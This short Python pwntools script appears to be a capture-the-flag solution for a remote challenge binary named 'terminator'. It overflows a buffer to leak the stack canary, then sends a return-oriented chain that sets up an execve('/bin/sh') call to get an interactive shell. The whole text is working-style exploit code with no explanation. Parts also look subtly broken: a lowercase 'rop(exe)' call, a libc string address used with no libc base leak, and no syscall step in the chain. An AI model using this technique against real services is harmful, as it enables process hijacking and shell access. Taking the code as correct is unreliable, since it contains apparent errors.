from pwn import *
context.arch = 'amd64'
exe=context.binary=ELF('../terminator')
libc=ELF('../libc.so.6')
r = remote("terminator.challs.olicyber.it", 10307)
addr_str  = next(libc.search(b'/bin/sh'))
r.recvline()
r.recvuntil(b'\n> ')
r.sendline(b'a'*55)
print(addr_str)
r.recvuntil("\n\n")
canary=(r.recv(7).replace(b'Nice',b''))+b'\x00'
rop=rop(exe)
rop.raw(b'a'*55+canary+b"a"*8)
rop(rax=59,rdi=addr_str,rsi=0,rdx=0)

r.sendline(rop.chain())

r.interactive()


